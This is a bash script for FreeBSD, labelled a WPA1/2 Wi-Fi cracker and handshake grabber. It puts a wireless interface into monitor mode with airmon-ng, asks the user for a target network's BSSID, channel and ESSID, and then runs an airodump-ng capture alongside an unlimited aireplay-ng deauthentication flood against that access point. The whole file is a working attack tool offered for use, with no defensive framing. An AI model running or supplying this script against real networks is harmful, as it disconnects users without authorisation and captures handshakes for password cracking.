#!/bin/bash
#Freebsd WPA1/2 Wifi Cracker(Handshake Graber) 0.002.2(Working)
clear

##Functions##
f_banner(){
	echo "LOGO HERE "#LOGO HERE
	echo " "
}
f_rootcheck(){
if [ $(id -u) -gt 0 ];then
        echo "This script requires ROOT or SUDO privileges"
        exit
fi
}
f_wlans(){
	wlansdevices=`ifconfig | awk '{print $1}' | grep wlan | sed 's/:/ /g'`
	echo $wlansdevices
	printf "Please select a interface> "
	read -r wlandev
	parent_interface=`ifconfig | grep -A 10 $wlandev | grep parent | awk '{print $3}'`
}
f_airmonon(){
	printf "Placing $wlandev into monitoring mode"
	airmon-ng start $parent_interface
	printf "$wlandev is now in monitor mode"
}
f_airmonoff(){
	printf "Disabling monitor mode."
	airmon-ng stop $parent_interface
}
f_airodump_bssid(){
	airodump-ng $wlandev
	printf "Enter BSSID to attack> "
	read -r bssid
	printf "Enter CHANNELto attack> "
	read -r bssidchan
	printf "Enter ESSID to attack> "
	read -r essid
}
f_airattack(){
	echo "Launching WPA Handshake Deauth Attack"
	xterm -e bash -c "sudo airodump-ng -c$bssidchan -w $essid -d $bssid $wlandev" &
	xterm -e bash -c "sudo aireplay-ng --deauth 0 -a $bssid $wlandev" 
	exit
}

f_banner
f_wlans
f_airmonon
f_airodump_bssid
f_airattack
#if_airmonoff
